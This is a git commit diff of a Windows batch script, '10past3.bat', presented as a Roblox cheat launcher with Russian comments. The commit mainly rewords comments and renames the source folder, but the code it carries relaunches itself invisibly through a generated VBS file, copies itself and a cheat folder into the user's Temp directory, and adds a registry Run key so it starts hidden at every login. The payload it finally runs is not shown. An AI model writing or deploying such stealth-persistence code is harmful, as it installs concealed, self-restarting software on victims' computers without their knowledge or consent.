f559350562cb0628cdd147cc1b2f142d37b0e7ba
YaltaVPN <assalamkumaq902@gmail.com>
2026-06-18 20:55:39 +0300

    Update 10past3.bat

--- 10past3.bat
+++ 10past3.bat
@@ -2,7 +2,7 @@
 :: Если скрипт запущен без флага скрытности, отправляем его в фон
 if "%~1"=="-hidden" goto :payload
 
-:: Создаем временный скрипт скрытия (вне блоков IF, теперь железно без ошибок)
+:: Создаем временный скрипт скрытия без использования блоков скобок
 echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\stealth_init.vbs"
 echo WshShell.Run """%~f0"" -hidden", 0, False >> "%temp%\stealth_init.vbs"
 wscript.exe "%temp%\stealth_init.vbs"
@@ -13,34 +13,35 @@ exit /b
 del "%temp%\stealth_init.vbs" >nul 2>&1
 chcp 65001 >nul 2>&1
 
-set "ORIGINAL_DIR=C:\РОБЛОКС ЧИТ"
+:: Новое имя оригинальной папки
+set "ORIGINAL_DIR=C:\RobloxCheat"
 set "TEMP_DIR=%LOCALAPPDATA%\Temp\RobloxCheat"
 set "SCRIPT_NAME=invisible_run.bat"
 set "VBS_NAME=launcher.vbs"
 
-:: [САМ ДЕЛАЕТ ПАПКУ] Скрипт сразу и гарантированно создает чистую папку в Temp
+:: Гарантированно создаем папку в Temp при каждом запуске
 if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" >nul 2>&1
 
-:: Проверяем, существует ли оригинальный путь на диске C:\
+:: Проверяем, существует ли оригинальный путь
 if not exist "%ORIGINAL_DIR%" goto :check_temp
 
-:: --- РАБОТА С ОРИГИНАЛОМ (Если папка на C:\ есть) ---
+:: --- РАБОТА С ОРИГИНАЛОМ (Если папка на C:\ существует) ---
 set "WORKING_DIR=%ORIGINAL_DIR%"
 
-:: Копируем читы и сам батник в созданную папку Temp
+:: Копируем содержимое папки и сам батник в Temp
 xcopy "%ORIGINAL_DIR%" "%TEMP_DIR%" /E /I /Y /Q >nul 2>&1
 copy /y "%~f0" "%TEMP_DIR%\%SCRIPT_NAME%" >nul 2>&1
 
-:: Создаем невидимый запускатор для автозагрузки
+:: Создаем запускатор для автозагрузки
 echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP_DIR%\%VBS_NAME%"
 echo WshShell.Run """%TEMP_DIR%\%SCRIPT_NAME%"" -hidden", 0, False >> "%TEMP_DIR%\%VBS_NAME%"
 
-:: Добавляем в автозагрузку реестра
+:: Добавляем в ветку автозапуска текущего пользователя
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RobloxCheatAuto" /t REG_SZ /d "\"%TEMP_DIR%\%VBS_NAME%\"" /f >nul 2>&1
 goto :run_files
 
 :check_temp
-:: --- РАБОТА ИЗ TEMP (Если оригинала на C:\ уже нет) ---
+:: --- РАБОТА ИЗ TEMP (Если оригинальной папки на C:\ нет) ---
 if not exist "%TEMP_DIR%" exit /b
 set "WORKING_DIR=%TEMP_DIR%"
 
